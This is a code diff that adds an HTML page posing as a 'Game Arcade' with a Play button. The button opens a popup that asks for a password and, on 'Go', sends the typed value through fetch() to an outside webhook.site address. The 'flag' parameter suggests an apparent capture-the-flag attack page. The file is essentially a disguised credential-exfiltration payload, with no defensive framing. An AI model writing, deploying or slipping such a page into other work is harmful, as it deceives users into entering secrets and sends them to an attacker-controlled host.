@@ -1,0 +1,26 @@
+<html>
+  <body>
+    Game Arcade
+    <button id="file-1" onclick="openPopup()">Play</button>
+
+    <script>
+      function openPopup() {
+        const win = window.open(URL.createObjectURL(new Blob([`
+          <html>
+            <body>
+              <input id="guessInp" />
+              <input id="passwordInp" />
+              <button id="changePwdBtn" onclick="exfil()">Go</button>
+              <script>
+                function exfil() {
+                  fetch('https://webhook.site/9d90e1e5-ed37-4daa-a930-82a7268644d3?flag=' + 
+                    encodeURIComponent(document.getElementById('passwordInp').value));
+                }
+              </script>
+            </body>
+          </html>
+        `], { type: 'text/html' })));
+      }
+    </script>
+  </body>
+</html>
